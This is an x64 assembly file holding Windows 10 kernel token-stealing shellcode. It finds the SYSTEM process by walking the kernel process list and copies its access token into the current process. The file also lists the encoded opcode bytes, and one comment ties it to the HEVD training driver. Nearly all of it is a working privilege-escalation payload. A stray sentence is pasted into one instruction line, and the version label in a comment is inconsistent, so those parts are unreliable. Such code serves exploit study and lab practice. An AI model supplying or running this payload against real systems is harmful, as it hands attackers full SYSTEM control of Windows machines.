ASM
[BITS 64]

_start:

; Notes :
; RAX will point onto the current process
; RBX will point onto SYSTEM process
; RCX will contain the SYSTEM token

; step 1 - get the current process (_EPROCESS) value into RAX :
xor rax, rax
mov rax, [gs:0x188]
mov rax, [rax + 0xb8]

; step 2 - find the E_PROCESS of SYSTEM (pid = 4) and adjust RBX to point onto it :
mov rbx, rax
__findsystem:
    mov rbx, [rbx + 0x2f0] 		; Get nt!_EPROCESS.ActiveProcessLinks.Flink
    sub rbx, 0x2f0      	   	; 
    mov rcx, [rbx + 0x2e8] 		; Get nt!_EPROCESS.UniqueProcessId (PID)
    cmp rcx, 4 			        ; Compare PID to SYSTEM PID 4
jnz __findsystem			    ; Loop until SYSTEM PID is found

; step 3 - replace the current process token with the SYSTEM token and return
mov rcx, [rbx + 0x360]        ; Get SYSTEM process nt!_EPROCESS.Token
and cl, 0xf0			      ; Clear out _EX_FAST_REF RefCnt
mov [rax + 0x360], rcx        ; Replace the tokenHere is the shellcode for token stealing on Win10 version 10.0.18363 (19H1) :

xor rax, rax                  ; Set NTSTATUS SUCCESS
ret

; Here is the shellcode for token stealing on Win10 version 10.0.18363 (19H1) :
; opcodes
; # step 1
; "\x48\x31\xC0"                         # xor rax, rax
; "\x65\x48\x8B\x04\x25\x88\x01\x00\x00" # mov rax, [gs:0x188]
; "\x48\x8B\x80\xB8\x00\x00\x00"         # mov rax, [rax + 0xb8]
; "\x48\x89\xC3"                         # mov rbx, rax
; # step 2 - __findsystem:
; "\x48\x8B\x9B\xF0\x02\x00\x00"         # mov rbx, [rbx + 0x2f0]
; "\x48\x81\xEB\xF0\x02\x00\x00"         # sub rbx, 0x2f0
; "\x48\x8B\x8B\xE8\x02\x00\x00"         # mov rcx, [rbx + 0x2e8]
; "\x48\x83\xF9\x04"                     # cmp rcx, 4
; "\x75\xE5"                             # jne __findsystem
; # step 3
; "\x48\x8B\x8B\x60\x03\x00\x00"         # mov rcx, [rbx + 0x360]
; "\x80\xE1\xF0"                         # and cl, 0xf0
; "\x48\x89\x88\x60\x03\x00\x00"         # mov [rax + 0x360], rcx
; "\x48\x83\xC4\x40"                     # add rsp, 0x40 ; RESTORE (Specific to HEVD)
; "\x48\x31\xC0"                         # xor rax, rax
; "\xC3"                                 # ret
